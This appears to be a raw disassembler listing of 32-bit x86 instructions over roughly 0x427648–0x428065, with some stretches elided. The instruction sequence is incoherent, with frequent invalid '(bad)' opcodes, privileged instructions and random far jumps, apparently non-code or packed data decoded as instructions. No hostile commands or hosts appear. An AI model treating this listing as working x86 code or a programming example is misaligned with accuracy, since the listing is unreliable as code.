  427648:	mov    eax,ds:0xc1018dfc
  42764d:	jae    0x42769d
  42764f:	imul   BYTE PTR [ebp+0x554a5233]
  427655:	pop    esp
  427656:	mov    ds:0x1089e897,eax
  42765b:	pop    esp
  42765c:	sbb    DWORD PTR [edi-0x25],ecx
  42765f:	inc    edi
  427660:	aad    0x81
  427662:	outs   dx,DWORD PTR ds:[esi]
  427663:	addr16 call 0x8da5:0x4d9fd54a
  42766b:	dec    ecx
  42766c:	popa   
  42766d:	cmp    ebx,DWORD PTR [esi+0x2]
  427670:	lock aas 
  427672:	in     al,0x3
  427674:	dec    ecx
  427675:	bound  eax,QWORD PTR [esi+edx*2]
  427678:	pop    ebx
  427679:	or     esi,DWORD PTR [ebx-0x1d58a613]
  42767f:	mov    WORD PTR [ebx-0x34],?
  427682:	sbb    BYTE PTR [ecx+0x13ce38b7],ch
  427688:	push   edx
  427689:	lods   eax,DWORD PTR ds:[esi]
  42768a:	test   esi,0x4694d7f7
	...
  4276f4:	add    DWORD PTR [esi-0x70],edx
  4276f7:	out    dx,al
  4276f8:	xlat   BYTE PTR ds:[ebx]
  4276f9:	out    dx,al
  4276fa:	jg     0x4276fb
  4276fc:	in     al,dx
  4276fd:	xor    al,0x86
  4276ff:	fstp   DWORD PTR [esi+esi*1]
  427702:	ins    BYTE PTR es:[edi],dx
  427703:	icebp  
  427704:	sbb    al,0xa5
  427706:	add    DWORD PTR [eax],eax
  427708:	add    al,0x1
  42770a:	add    BYTE PTR [eax],al
  42770c:	mov    al,ds:0xfa8a85b7
  427711:	push   edx
  427712:	nop
  427713:	popf   
  427714:	into   
  427715:	popa   
  427716:	fisttp DWORD PTR ds:0x95d86dad
  42771c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42771d:	pop    ds
  42771e:	push   ecx
  42771f:	inc    esp
  427720:	or     bl,BYTE PTR [ebp-0x5db82fc0]
  427726:	mov    BYTE PTR [esp+ecx*4-0x761ef0ae],dl
  42772d:	(bad)  
  42772f:	repnz sahf 
  427731:	popf   
  427732:	fs jb  0x4276e7
  427735:	xor    eax,0xbad2e938
  42773a:	xor    DWORD PTR [ebp-0x25],esp
  42773d:	into   
  42773e:	sbb    DWORD PTR [ebp+0x743fadbe],ebp
  427744:	pop    ss
  427745:	jns    0x427762
  427747:	test   al,0x48
  427749:	inc    DWORD PTR [ebx+0x50]
  42774c:	fisub  WORD PTR [ebp-0x7c90e6f5]
  427752:	call   0xcfb14516
  427757:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427758:	or     dl,BYTE PTR [esi-0x5a]
  42775b:	mov    esi,0x3926b776
  427760:	idiv   BYTE PTR [esi]
  427762:	and    eax,0xc0111076
  427767:	sub    cl,BYTE PTR [esi-0x1589d4ae]
  42776d:	adc    dh,BYTE PTR [ecx+ecx*2]
  427770:	mov    esi,0xa5bf8a0
  427775:	aas    
  427776:	mov    al,0xea
  427778:	adc    ah,BYTE PTR [eax+0x5a]
  42777b:	dec    edx
  42777c:	pop    edi
  42777d:	jne    0x4277bd
  42777f:	popa   
  427780:	mov    ds,WORD PTR [eax-0x1f]
  427783:	dec    edi
  427784:	hlt    
  427785:	cmc    
  427786:	push   esp
  427787:	mov    edx,0x32803f5c
  42778c:	pop    ss
  42778d:	loope  0x42773d
  42778f:	imul   esp,DWORD PTR [edx],0xffffffe8
  427792:	cmp    BYTE PTR ds:0x586081b3,dl
  427798:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427799:	rcl    BYTE PTR [edi],0x62
  42779c:	enter  0x97bc,0xae
  4277a0:	dec    eax
  4277a1:	xchg   DWORD PTR [eax-0x4d],esp
  4277a4:	sub    eax,0x6648d993
  4277a9:	or     eax,0xb0c5bbff
  4277ae:	(bad)  
  4277af:	arpl   WORD PTR [edx-0x6f281e17],bp
  4277b5:	jecxz  0x4277ec
  4277b7:	xchg   edx,eax
  4277b8:	fwait
  4277b9:	inc    edi
  4277ba:	outs   dx,BYTE PTR ds:[esi]
  4277bb:	cld    
  4277bc:	pop    edi
  4277bd:	lahf   
  4277be:	push   ebx
  4277bf:	jno    0x42775d
  4277c1:	mov    ch,0x50
  4277c3:	xor    al,0xea
  4277c5:	jnp    0x4277ff
  4277c7:	xor    eax,0x7f74e1f2
  4277cc:	jno    0x42780d
  4277ce:	(bad)  
  4277cf:	aad    0x8e
  4277d1:	mov    cs,esi
  4277d3:	xor    DWORD PTR [edi-0x1c5f2f47],esi
  4277d9:	jnp    0x4277a4
  4277db:	test   al,0x91
  4277dd:	xchg   ebp,eax
  4277de:	xchg   DWORD PTR [esi+0x5bf23eee],edi
  4277e4:	push   cs
  4277e5:	mov    ebp,0xa1fdfec1
  4277ea:	popa   
  4277eb:	sti    
  4277ec:	loop   0x4277f1
  4277ee:	xor    eax,0xb2dab7ed
  4277f3:	jmp    0xa3d1:0xd7390180
  4277fa:	arpl   WORD PTR cs:[edx-0x3e],di
  4277fe:	xchg   ecx,eax
  4277ff:	test   BYTE PTR [ebx-0x66],dh
  427802:	pushf  
  427803:	lods   eax,DWORD PTR ds:[esi]
  427804:	inc    ecx
  427805:	sub    al,0x9f
  427807:	mov    edi,0xb29ecb91
  42780c:	or     ah,al
  42780e:	dec    ebx
  42780f:	test   eax,0x0
	...
  427874:	sbb    cl,BYTE PTR [edx-0x3a64baf5]
  42787a:	pop    esi
  42787b:	fbstp  TBYTE PTR [eax+0x65]
  42787e:	fldl2e 
  427880:	(bad)  
  427881:	cmc    
  427882:	sub    DWORD PTR [esi],edi
  427884:	and    BYTE PTR [esi+0x1040001],ah
  42788a:	add    BYTE PTR [eax],al
  42788c:	cmp    BYTE PTR [ebp-0x1b],bl
  42788f:	sbb    DWORD PTR [ebx-0x76],edi
  427892:	mov    bh,0xe0
  427894:	adc    esp,edx
  427896:	(bad)  [edi+0x3532cb5f]
  42789c:	lods   eax,DWORD PTR ds:[esi]
  42789d:	test   al,0xc9
  42789f:	mov    eax,ds:0x6359787e
  4278a4:	fistp  WORD PTR ss:[eax]
  4278a7:	addr16 into 
  4278a9:	cmp    BYTE PTR [ecx],bh
  4278ab:	test   edx,ebx
  4278ad:	dec    edi
  4278ae:	lods   eax,DWORD PTR ds:[esi]
  4278af:	pop    edx
  4278b0:	test   BYTE PTR [ebx],bh
  4278b2:	inc    esi
  4278b3:	push   edi
  4278b4:	das    
  4278b5:	mov    bl,BYTE PTR [ebp-0x5e]
  4278b8:	jecxz  0x42789e
  4278ba:	mul    DWORD PTR [esp+ebx*2+0x6629492f]
  4278c1:	inc    esp
  4278c2:	pop    esp
  4278c3:	int    0x18
  4278c5:	add    esi,DWORD PTR ds:0x70efb49d
  4278cb:	gs push 0x49
  4278ce:	mov    ds:0xfca90921,al
  4278d3:	mov    cl,0x76
  4278d5:	mov    edi,0x68a8370c
  4278da:	xchg   edi,eax
  4278db:	jns    0x4278d5
  4278dd:	or     edi,DWORD PTR [eax-0x41b8a387]
  4278e3:	loope  0x42788a
  4278e5:	pop    ebp
  4278e6:	or     ch,dh
  4278e8:	cld    
  4278e9:	mov    al,ds:0x24c5ea1
  4278ee:	xchg   ebp,eax
  4278ef:	xchg   ecx,eax
  4278f0:	xchg   ecx,eax
  4278f1:	fsubrp st(4),st
  4278f3:	je     0x42791d
  4278f5:	mov    al,0x6b
  4278f7:	aam    0x6f
  4278f9:	dec    ecx
  4278fa:	aad    0x1f
  4278fc:	cmp    esp,DWORD PTR [ebp+0x7404ace5]
  427902:	rcl    cl,0x5b
  427905:	out    dx,al
  427906:	sti    
  427907:	shl    BYTE PTR [ebx+0x1918ce8f],cl
  42790d:	pop    eax
  42790f:	pop    ecx
  427910:	stc    
  427911:	in     eax,0x12
  427913:	dec    esp
  427914:	not    DWORD PTR [edx-0x6]
  427917:	push   0x4b
  427919:	fisub  WORD PTR [ebx+0x32]
  42791c:	mov    esp,0x1eb40ed9
  427921:	stos   DWORD PTR es:[edi],eax
  427922:	icebp  
  427923:	mov    al,ds:0x332c1d00
  427928:	lock pop eax
  42792a:	lea    edi,[edx]
  42792c:	scas   al,BYTE PTR es:[edi]
  42792d:	xchg   edi,eax
  42792e:	pop    eax
  42792f:	pop    edi
  427930:	outs   dx,DWORD PTR ss:[esi]
  427932:	push   cs
  427933:	(bad)  
  427934:	mov    bh,0x31
  427936:	xor    al,0xd
  427938:	mov    al,0x6e
  42793a:	jne    0x427969
  42793c:	add    cl,dh
  42793e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42793f:	jae    0x427931
  427941:	push   eax
  427942:	sbb    al,BYTE PTR [edx]
  427944:	add    al,0x44
  427946:	add    BYTE PTR [eax-0x2aaf6c50],dh
  42794c:	(bad)  
  42794d:	cli    
  42794e:	shr    BYTE PTR [edx-0x7b8f058c],cl
  427954:	inc    eax
  427955:	pop    es
  427956:	sbb    BYTE PTR [eax],bl
  427958:	inc    esp
  427959:	retf   
  42795a:	in     eax,0xc8
  42795c:	in     eax,0x10
  42795e:	sbb    cl,BYTE PTR [edx+0xaf702be]
  427964:	and    dh,bl
  427966:	mov    esi,0x25098fe6
  42796b:	pop    esp
  42796c:	adc    eax,0x73a494a5
  427971:	mov    ebp,0xbf616fc5
  427976:	enter  0x3691,0xba
  42797a:	mov    ah,0x58
  42797c:	es mov edi,0xaf0eb787
  427982:	stos   BYTE PTR es:[edi],al
  427983:	sbb    dl,BYTE PTR [edi]
  427985:	inc    edi
  427986:	lods   eax,DWORD PTR ds:[esi]
  427987:	mov    WORD PTR [edi+0x78aff4eb],gs
  42798d:	stos   DWORD PTR es:[edi],eax
  42798e:	fnstcw WORD PTR [eax+eax*1]
	...
  4279f1:	add    BYTE PTR [eax],al
  4279f3:	add    BYTE PTR [edx-0x5c0023],bl
  4279f9:	mov    ds:0x7542fdde,eax
  4279fe:	fadd   DWORD PTR [ebx+0xf89bf0]
  427a04:	and    al,0xa7
  427a06:	add    DWORD PTR [eax],eax
  427a08:	add    al,0x1
  427a0a:	add    BYTE PTR [eax],al
  427a0c:	retf   
  427a0d:	ins    DWORD PTR es:[edi],dx
  427a0e:	loopne 0x4279ad
  427a10:	pop    ds
  427a11:	mov    bl,0x8
  427a13:	sub    BYTE PTR [edi],0xd5
  427a16:	pushf  
  427a17:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427a18:	xor    bh,dh
  427a1a:	hlt    
  427a1b:	sahf   
  427a1c:	adc    DWORD PTR [ecx+0x56c62b91],edi
  427a22:	and    al,0xf1
  427a24:	xor    dl,BYTE PTR ds:0x9b9a02e0
  427a2a:	ror    DWORD PTR [ecx],cl
  427a2c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427a2d:	mov    DWORD PTR [ebx],edx
  427a2f:	mov    eax,0xbc480298
  427a34:	jnp    0x427a73
  427a36:	add    ecx,edx
  427a38:	sub    eax,0xa9d1d74c
  427a3d:	dec    edx
  427a3e:	fisub  WORD PTR ds:0x7a29581b
  427a44:	sub    eax,0x271a7e6
  427a49:	adc    esp,DWORD PTR [ecx+ebx*4+0x58696eb1]
  427a50:	mov    bl,0xa2
  427a52:	(bad)  
  427a53:	lock dec esp
  427a55:	daa    
  427a56:	ja     0x4279f8
  427a58:	pop    eax
  427a59:	retf   0x2c81
  427a5c:	push   edi
  427a5d:	scas   eax,DWORD PTR es:[edi]
  427a5e:	and    eax,ebx
  427a60:	sbb    ebp,DWORD PTR [edx]
  427a62:	repnz daa 
  427a64:	retf   0xaa2b
  427a67:	mov    DWORD PTR [ecx],esp
  427a69:	sbb    ch,BYTE PTR [esi+0x2c18d9f6]
  427a6f:	out    0x91,eax
  427a71:	out    0xfc,al
  427a73:	xchg   esi,eax
  427a74:	stc    
  427a75:	int    0x7a
  427a77:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427a78:	sbb    DWORD PTR [ecx-0x2f],0xffffff9b
  427a7c:	cs lock (bad) 
  427a7f:	ds lahf 
  427a81:	pop    edx
  427a82:	in     eax,0x1a
  427a84:	cmovs  edi,ebp
  427a87:	adc    BYTE PTR [di+0x495],ch
  427a8c:	retf   
  427a8d:	icebp  
  427a8e:	sbb    DWORD PTR [esp+edi*2],ebp
  427a91:	sahf   
  427a92:	lock inc esi
  427a94:	or     al,0x1b
  427a96:	push   edx
  427a97:	dec    edx
  427a98:	iret   
  427a99:	xlat   BYTE PTR ds:[ebx]
  427a9a:	jb     0x427a3e
  427a9c:	inc    edx
  427a9d:	mov    ds:0x572cd99a,eax
  427aa2:	int    0xc1
  427aa4:	mov    dl,0x47
  427aa6:	rol    BYTE PTR [ebx+ecx*8],1
  427aa9:	mov    DWORD PTR [ebp-0x7],esp
  427aac:	shl    DWORD PTR [eax],cl
  427aae:	data16 cmp BYTE PTR [ebp-0x5f],dl
  427ab2:	sub    BYTE PTR [ebx],0x9f
  427ab5:	out    0x54,eax
  427ab7:	(bad)  
  427ab8:	bound  eax,QWORD PTR [ebx+0x2]
  427abb:	(bad)  
  427abc:	retf   
  427abd:	sub    ebp,0x81e9e4e7
  427ac3:	dec    edi
  427ac4:	popf   
  427ac5:	in     eax,dx
  427ac6:	test   eax,0xc605fa49
  427acb:	xchg   BYTE PTR [ebp+ecx*4-0x3a],dl
  427acf:	add    al,0xc0
  427ad1:	fdivr  DWORD PTR [ebx]
  427ad3:	jp     0x427b3c
  427ad5:	retf   
  427ad6:	xchg   esp,eax
  427ad7:	and    dl,BYTE PTR ds:0x89ffdb04
  427add:	jne    0x427ad7
  427adf:	jg     0x427a6b
  427ae1:	jg     0x427a83
  427ae3:	mov    ebp,0x14936744
  427ae8:	and    ebp,eax
  427aea:	xchg   DWORD PTR [esi+esi*2],eax
  427aed:	adc    BYTE PTR [eax],bh
  427aef:	leave  
  427af0:	dec    esi
  427af1:	sbb    dh,bh
  427af3:	retf   
  427af4:	bound  eax,QWORD PTR [ebp-0x215b0155]
  427afa:	adc    al,0xbb
  427afc:	mov    al,0x32
  427afe:	mov    bl,0x7c
  427b00:	gs lahf 
  427b02:	xchg   DWORD PTR [ebp-0x16],esp
  427b05:	aad    0x14
  427b07:	pop    edi
  427b08:	xchg   DWORD PTR fs:[ecx-0x626b07ca],ecx
  427b0f:	mov    al,BYTE PTR [eax]
	...
  427b71:	add    BYTE PTR [eax],al
  427b73:	add    dl,cl
  427b75:	mov    edx,DWORD PTR [edx+0x7b]
  427b78:	push   ebx
  427b79:	sti    
  427b7a:	jmp    0x427b37
  427b7c:	push   ecx
  427b7d:	mov    ecx,ebx
  427b7f:	neg    BYTE PTR [ebp-0x40]
  427b82:	fdivr  DWORD PTR [ebx+0x28]
  427b85:	test   al,0x1
  427b87:	add    BYTE PTR [ecx+eax*1],al
  427b8a:	add    BYTE PTR [eax],al
  427b8c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427b8d:	jae    0x427b4b
  427b8f:	adc    esi,DWORD PTR [edi]
  427b91:	sbb    al,0xeb
  427b93:	jns    0x427b90
  427b95:	jge    0x427b55
  427b97:	add    DWORD PTR [esi+0x7ddb4fff],esp
  427b9d:	(bad)
  427ba0:	pop    es
  427ba1:	into   
  427ba2:	stos   BYTE PTR es:[edi],al
  427ba3:	into   
  427ba4:	and    cl,BYTE PTR [ecx]
  427ba6:	pop    ds
  427ba7:	(bad)  
  427ba8:	mov    cl,0x80
  427baa:	mov    DWORD PTR [esi+0x12],eax
  427bad:	mov    bl,0x34
  427baf:	inc    edi
  427bb0:	push   ebp
  427bb1:	dec    ebx
  427bb2:	das    
  427bb3:	sahf   
  427bb4:	data16 scas al,BYTE PTR es:[edi]
  427bb6:	lds    edx,FWORD PTR [edi]
  427bb8:	outs   dx,BYTE PTR ds:[esi]
  427bb9:	unpckhps xmm0,XMMWORD PTR [ecx-0x4]
  427bbd:	inc    ebp
  427bbe:	push   ecx
  427bbf:	mov    al,0x7a
  427bc1:	push   eax
  427bc2:	scas   al,BYTE PTR es:[edi]
  427bc3:	add    ah,0x10
  427bc6:	pop    ebp
  427bc7:	push   ebp
  427bc8:	inc    ecx
  427bc9:	xchg   bl,ch
  427bcb:	out    dx,eax
  427bcc:	div    BYTE PTR [ebx]
  427bce:	aaa    
  427bcf:	ja     0x427b75
  427bd1:	dec    esp
  427bd2:	and    eax,0x38ccf248
  427bd7:	nop
  427bd8:	stos   DWORD PTR es:[edi],eax
  427bd9:	outs   dx,BYTE PTR ds:[esi]
  427bda:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427bdb:	ja     0x427c0a
  427bdd:	pop    ecx
  427bde:	fwait
  427bdf:	and    bh,BYTE PTR [ebx]
  427be1:	jl     0x427c16
  427be3:	popf   
  427be4:	jge    0x427c19
  427be6:	pop    es
  427be7:	cld    
  427be8:	jne    0x427b98
  427bea:	mov    bl,0x42
  427bec:	xchg   edi,eax
  427bed:	fisttp QWORD PTR [edi+0x1b0017b5]
  427bf3:	mov    ch,0xa3
  427bf5:	cmp    eax,DWORD PTR [edi+0x69ce53eb]
  427bfb:	aaa    
  427bfc:	ins    DWORD PTR es:[edi],dx
  427bfd:	(bad)  
  427bfe:	push   ss
  427bff:	push   ds
  427c00:	mov    eax,esp
  427c02:	jecxz  0x427bde
  427c04:	jl     0x427bd6
  427c06:	mov    DWORD PTR [edx-0x49],edi
  427c09:	sub    DWORD PTR [esi+0x2934fbb2],edx
  427c0f:	mov    WORD PTR [esp+edx*4],gs
  427c12:	mov    ebp,0xf1ab7242
  427c17:	mov    esi,0xf73f1faa
  427c1c:	jmp    0xbeb1:0x98753d64
  427c23:	loope  0x427c88
  427c25:	fdiv   QWORD PTR [edi+0x17]
  427c28:	popf   
  427c29:	cs cld 
  427c2b:	nop
  427c2c:	arpl   WORD PTR [ebp-0x8],dx
  427c2f:	or     dh,dl
  427c31:	pushf  
  427c32:	pop    esi
  427c33:	iret   
  427c34:	fist   DWORD PTR ds:0x144fffc9
  427c3a:	retf   
  427c3b:	cmp    esp,esi
  427c3d:	mov    bh,0xf2
  427c3f:	mul    BYTE PTR [edx-0x59]
  427c42:	sbb    eax,0x4c052bc
  427c47:	sbb    cl,BYTE PTR [edi-0x6928205e]
  427c4d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427c4e:	dec    ebx
  427c4f:	fisubr DWORD PTR [ecx-0x6ac37ce0]
  427c55:	fcomp  DWORD PTR [edx-0x766a3e3e]
  427c5b:	jmp    0x404cf23
  427c60:	mov    DWORD PTR [eax+0x4aac41d6],esi
  427c66:	fcom   DWORD PTR [ebp+0x35baa64a]
  427c6c:	pop    es
  427c6d:	fmul   DWORD PTR [ebp+0x5f]
  427c70:	fs pop esp
  427c72:	retf   0x8216
  427c75:	add    cl,BYTE PTR [ecx+0x2]
  427c78:	and    bl,dh
  427c7a:	rcl    BYTE PTR [edx+0x32],1
  427c7d:	inc    esp
  427c7e:	xchg   edi,eax
  427c7f:	mov    dh,0x75
  427c81:	aas    
  427c82:	and    al,0x6c
  427c84:	lock and bh,al
  427c87:	sahf   
  427c88:	add    cl,BYTE PTR [edx]
  427c8a:	xor    BYTE PTR [eax-0x7f6edf4f],dh
	...
  427cf4:	mov    ds:0xf343b050,eax
  427cf9:	jecxz  0x427cee
  427cfb:	lock xchg DWORD PTR ds:0x85cc5d44,ebx
  427d02:	mov    ds:0x1a92c8b,eax
  427d07:	add    BYTE PTR [ecx+eax*1],al
  427d0a:	add    BYTE PTR [eax],al
  427d0c:	daa    
  427d0d:	repnz push eax
  427d0f:	sahf   
  427d10:	dec    ebx
  427d11:	retf   0x97cd
  427d14:	push   es
  427d15:	jp     0x427d8a
  427d17:	mov    eax,ds:0xa356b51a
  427d1c:	out    dx,al
  427d1d:	hlt    
  427d1e:	into   
  427d1f:	cmp    eax,0x5876a81
  427d24:	fs ror ch,1
  427d27:	push   edx
  427d28:	inc    edx
  427d29:	idiv   ah
  427d2b:	ds mov cl,0x1e
  427d2e:	int    0x32
  427d30:	fstp   TBYTE PTR [ebx]
  427d32:	mov    ds:0x94e8c09e,eax
  427d37:	jl     0x427d7b
  427d39:	(bad)  
  427d3a:	sub    al,0xe7
  427d3c:	sbb    dh,BYTE PTR es:[edi+edx*4+0x285b89d9]
  427d44:	xlat   BYTE PTR ds:[ebx]
  427d45:	push   0x40
  427d47:	sub    eax,0xf484c866
  427d4c:	loope  0x427d8d
  427d4e:	rcl    DWORD PTR [ebx+0xfef1825],0x5f
  427d55:	xor    dl,BYTE PTR [ecx-0x38fd40d0]
  427d5b:	xor    al,bl
  427d5d:	imul   eax,DWORD PTR [ecx],0x8408b9b8
  427d63:	add    al,0xec
  427d65:	inc    ebx
  427d66:	lock adc esi,DWORD PTR [esi-0x5b]
  427d6a:	outs   dx,BYTE PTR ds:[esi]
  427d6b:	mov    ah,0xae
  427d6d:	xor    eax,0x73073ff9
  427d72:	or     al,BYTE PTR [eax]
  427d74:	retf   0xb08a
  427d77:	sub    ecx,DWORD PTR [esi-0x3b4d7efd]
  427d7d:	and    al,0x5c
  427d7f:	push   ds
  427d80:	adc    BYTE PTR [edx],dl
  427d82:	mov    eax,ds:0x59f00eed
  427d87:	ret    
  427d88:	test   al,0x67
  427d8a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427d8b:	scas   al,BYTE PTR es:[edi]
  427d8c:	xor    BYTE PTR [eax+ecx*4],0xba
  427d90:	stos   BYTE PTR es:[edi],al
  427d91:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427d92:	data16 aas 
  427d94:	rcl    ebx,cl
  427d96:	dec    ebp
  427d97:	pop    ss
  427d98:	mov    ebp,0x5a81ce72
  427d9d:	idiv   ebx
  427d9f:	clc    
  427da0:	fs test al,0x3d
  427da3:	push   eax
  427da4:	mov    al,0xf9
  427da6:	inc    eax
  427da7:	xor    BYTE PTR [ebx],ch
  427da9:	imul   eax,DWORD PTR [edx-0xe],0xffffff84
  427dad:	cmp    BYTE PTR [eax],bh
  427daf:	test   eax,0xc1ddd755
  427db4:	test   ecx,esi
  427db6:	rcl    bh,1
  427db8:	cdq    
  427db9:	and    al,0x3f
  427dbb:	xor    eax,0x6df298e5
  427dc0:	inc    edx
  427dc1:	out    dx,al
  427dc2:	dec    ebx
  427dc3:	mov    ds:0x94963877,eax
  427dc8:	(bad)  
  427dc9:	(bad)  
  427dca:	jmp    0x427e3f
  427dcc:	pop    DWORD PTR [edi-0x2e]
  427dcf:	cdq    
  427dd0:	sub    al,ah
  427dd2:	(bad)  
  427dd3:	jp     0x427dde
  427dd5:	je     0x427d71
  427dd7:	lahf   
  427dd8:	xchg   esi,eax
  427dd9:	lock xor bh,BYTE PTR [edi+ebp*4-0x72]
  427dde:	pop    ds
  427ddf:	iret   
  427de0:	xchg   edi,eax
  427de1:	jno    0x427e42
  427de3:	jp     0x427e21
  427de5:	inc    edx
  427de6:	(bad)  
  427de7:	inc    edi
  427de8:	xor    eax,0x47f204c3
  427ded:	xor    al,0x5
  427def:	sbb    al,0xe
  427df2:	add    dh,BYTE PTR [esi+ebx*8+0x1f]
  427df6:	(bad)  
  427df7:	aas    
  427df8:	fdivr  QWORD PTR [ecx]
  427dfa:	or     ch,ah
  427dfc:	aam    0x38
  427dfe:	imul   edi,DWORD PTR [edx+0x54],0x896e56cc
  427e05:	and    dh,al
  427e07:	or     al,0xe8
  427e09:	cwde   
  427e0a:	xchg   edi,eax
  427e0b:	int    0x63
  427e0d:	das    
  427e0e:	xor    BYTE PTR [ebx],al
	...
  427e74:	mov    eax,0x6d3c25f1
  427e79:	cld    
  427e7a:	mov    ecx,0x2bc293f5
  427e7f:	leave  
  427e80:	dec    esi
  427e81:	aas    
  427e82:	sbb    cl,BYTE PTR [ecx+0x30]
  427e85:	stos   BYTE PTR es:[edi],al
  427e86:	add    DWORD PTR [eax],eax
  427e88:	add    al,0x1
  427e8a:	add    BYTE PTR [eax],al
  427e8c:	mov    esp,0x325244d
  427e91:	js     0x427e19
  427e93:	ficomp WORD PTR [esi+0xe16e13f]
  427e99:	aaa    
  427e9a:	sbb    DWORD PTR [ebp-0x59],edi
  427e9d:	and    dh,bl
  427e9f:	aaa    
  427ea0:	push   ebx
  427ea1:	shl    DWORD PTR [edi+0x2b3ec700],1
  427ea7:	ja     0x427f1f
  427ea9:	(bad)  
  427eaa:	cmp    DWORD PTR [ecx+eiz*8-0x6d6cbf16],eax
  427eb1:	sbb    BYTE PTR [ebp+0x13],0x70
  427eb5:	adc    DWORD PTR [edi+0x5e],esi
  427eb8:	ja     0x427ee8
  427eba:	pop    ss
  427ebb:	repz push eax
  427ebd:	push   0xb7f19b9e
  427ec2:	fstp   DWORD PTR [edx]
  427ec4:	call   0xce423813
  427ec9:	rcl    BYTE PTR [ebx+0x7b],cl
  427ecc:	test   al,0xa
  427ece:	sbb    eax,0xdcbf97fa
  427ed3:	xchg   ebp,eax
  427ed4:	icebp  
  427ed5:	or     bl,BYTE PTR [ebx+0x56]
  427ed8:	or     DWORD PTR [esi],edx
  427eda:	jb     0x427f40
  427edc:	fs aam 0x9e
  427edf:	(bad)  
  427ee0:	mov    esi,edi
  427ee2:	sub    eax,0xdd7c5a20
  427ee7:	sti    
  427ee8:	lds    ebp,FWORD PTR [eax]
  427eea:	inc    eax
  427eeb:	pop    esi
  427eec:	xor    edi,DWORD PTR [ebp+0x50]
  427eef:	loope  0x427f17
  427ef1:	push   edi
  427ef2:	xor    BYTE PTR [eax+ecx*4+0x6a],al
  427ef6:	or     esi,DWORD PTR [ebx+0x27]
  427ef9:	mov    BYTE PTR [ebx],ch
  427efb:	addr16 xchg ebx,eax
  427efd:	mov    ds:0x3b0e78f7,eax
  427f02:	int3   
  427f03:	cmp    dl,dl
  427f05:	jmp    0xf94d:0x4171d32a
  427f0c:	aam    0x0
  427f0e:	test   al,0xd0
  427f10:	sahf   
  427f11:	fdiv   st,st(3)
  427f13:	xchg   DWORD PTR [esi-0x5809b488],esi
  427f19:	cmp    eax,0xe14a66df
  427f1e:	in     al,0x42
  427f20:	dec    ebp
  427f21:	inc    edi
  427f22:	push   esp
  427f23:	sbb    al,0xd8
  427f25:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427f26:	or     esi,ebp
  427f28:	pop    ss
  427f29:	leave  
  427f2a:	push   edi
  427f2b:	adc    DWORD PTR [ebx+0x51c21b18],eax
  427f31:	fcom   st(4)
  427f33:	daa    
  427f34:	addr16 in al,dx
  427f36:	dec    ecx
  427f37:	imul   esi,DWORD PTR [ebx+0x6c],0x5170782
  427f3e:	adc    al,0x51
  427f40:	mov    ebx,gs
  427f42:	(bad)  
  427f43:	mov    ah,0xaf
  427f45:	out    0x62,eax
  427f47:	pop    ss
  427f48:	sti    
  427f49:	push   ebx
  427f4a:	rcl    ecx,0x25
  427f4d:	scas   al,BYTE PTR es:[edi]
  427f4e:	and    ch,bh
  427f50:	outs   dx,BYTE PTR ds:[esi]
  427f51:	dec    esi
  427f52:	repz add DWORD PTR [eax+0xe4106e6],edi
  427f59:	hlt    
  427f5a:	pop    ds
  427f5b:	icebp  
  427f5c:	sub    al,0x85
  427f5e:	outs   dx,DWORD PTR ds:[esi]
  427f5f:	and    DWORD PTR [ecx-0x71],ebx
  427f62:	push   ss
  427f63:	jbe    0x427f80
  427f65:	jnp    0x427f2b
  427f67:	test   al,0x2e
  427f69:	cmp    al,0xce
  427f6b:	pop    ecx
  427f6c:	scas   eax,DWORD PTR es:[edi]
  427f6d:	sbb    DWORD PTR [ebx],ecx
  427f6f:	jg     0x427fcc
  427f71:	sub    esp,DWORD PTR [edi+0x4f]
  427f74:	pushf  
  427f75:	sti    
  427f76:	mov    bl,0x21
  427f78:	adc    al,0x5b
  427f7a:	xchg   edi,eax
  427f7b:	add    DWORD PTR [ecx*2-0x584ee11a],esi
  427f82:	xor    eax,0x6d0706d0
  427f87:	rol    DWORD PTR [ecx],0xa7
  427f8a:	enter  0x8bad,0x3
  427f8e:	sbb    dh,BYTE PTR [esi+0x0]
	...
  427ff4:	mov    cl,0xa7
  427ff6:	dec    ebx
  427ff7:	das    
  427ff8:	pop    edi
  427ff9:	out    dx,eax
  427ffa:	cmc    
  427ffb:	mov    edi,0x22b0803f
  428000:	mov    ebx,0x34ab930d
  428005:	stos   DWORD PTR es:[edi],eax
  428006:	add    DWORD PTR [eax],eax
  428008:	add    al,0x1
  42800a:	add    BYTE PTR [eax],al
  42800c:	xchg   esp,eax
  42800d:	mov    esp,ss
  42800f:	cld    
  428010:	dec    eax
  428011:	(bad)  
  428012:	cmp    DWORD PTR [eax-0x3d],esp
  428015:	add    BYTE PTR [ebx+0x62],al
  428018:	fidiv  DWORD PTR [ecx]
  42801a:	or     eax,0xb5ff75fa
  42801f:	jl     0x427ffc
  428021:	dec    esi
  428022:	adc    eax,0x3eccfd6e
  428027:	cwde   
  428028:	shl    bl,0xea
  42802b:	stc    
  42802c:	dec    ebx
  42802d:	jno    0x428064
  42802f:	lods   eax,DWORD PTR ds:[esi]
  428030:	xor    al,BYTE PTR [ebx]
  428032:	add    BYTE PTR ds:0x72a982ed,ch
  428038:	nop
  428039:	adc    ecx,0x6b
  42803c:	es adc cl,dh
  42803f:	and    DWORD PTR [ebx],edi
  428041:	inc    esp
  428042:	ficomp WORD PTR [esi-0x13bd0be2]
  428049:	(bad)  
  42804a:	fs push edi
  42804c:	cmp    DWORD PTR [ebx+eiz*8+0x782a98ec],esi
  428053:	push   cs
  428054:	sub    al,0x96
  428056:	bound  edi,QWORD PTR [esp+ebx*8]
  428059:	push   0x4f
  42805b:	scas   eax,DWORD PTR es:[edi]
  42805c:	xchg   ebx,eax
  42805d:	pop    ds
  42805e:	jl     0x427ff2
  428060:	sub    eax,0xc89b570
  428065:	stos   BYTE PTR es:[edi],al
